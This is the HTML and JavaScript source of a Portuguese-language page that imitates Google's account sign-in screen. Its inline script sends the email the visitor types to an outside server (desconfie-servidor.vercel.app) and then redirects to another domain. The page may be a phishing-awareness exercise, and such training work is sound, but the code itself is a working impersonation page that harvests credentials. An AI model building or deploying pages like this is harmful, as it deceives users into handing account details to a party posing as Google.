<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <link rel="preconnect" href="https://fonts.gstatic.com" />
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet" />

  <link rel="stylesheet" href="./reset.css" />
  <link rel="stylesheet" href="./style.css" />

  <title>Fazer login nas Contas do Google</title>
</head>

<body>
  <div class="container">
    <div class="card">
      <img src="./images/google-logo.svg" alt="" />
      <h2>Fazer login</h2>
      <h3>Use sua Conta do Google</h3>

      <form id="loginForm">
        <input type="email" id="email" name="email" placeholder="E-mail ou telefone" required />
        <div class="btn-email">
          <button type="button">Esqueceu seu e-mail?</button>
        </div>
        <p>
          Não está no seu computador? Use o modo visitante para fazer login com privacidade.
          <a href="">Saiba mais</a>
        </p>
        <div class="card-bottom">
          <a href="">Criar conta</a>
          <button type="submit">Próxima</button>
        </div>
      </form>
      <script>
        document.getElementById("loginForm").addEventListener("submit", async function (event) {
          event.preventDefault(); // Impede o envio padrão do formulário (que pode ser tratado como GET)

          const email = document.getElementById("email").value;

          if (!email) {
            alert("Por favor, insira um e-mail válido.");
            return;
          }

          const response = await fetch("https://desconfie-servidor.vercel.app/api/submit-login", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: new URLSearchParams({ email }),
          });

          const result = await response.json();
          console.log(result);

          if (response.ok) {
            window.location.href = "https://notificationsbr.com/convenia";
          } else {
            alert("Erro ao enviar dados. Tente novamente.");
          }
        });
      </script>
    </div>

    <div class="footer">
      <select name="select">
        <option value="Portugês (Brasil) selected">Portugês (Brasil)</option>
        <option value="English (United States)">
          English (United States)
        </option>
        <option value="Español (España)">Español (España)</option>
      </select>

      <div class="footer-span">
        <span>Ajuda</span>
        <span>Privacidade</span>
        <span>Termos</span>
      </div>
    </div>
  </div>
</body>

</html>
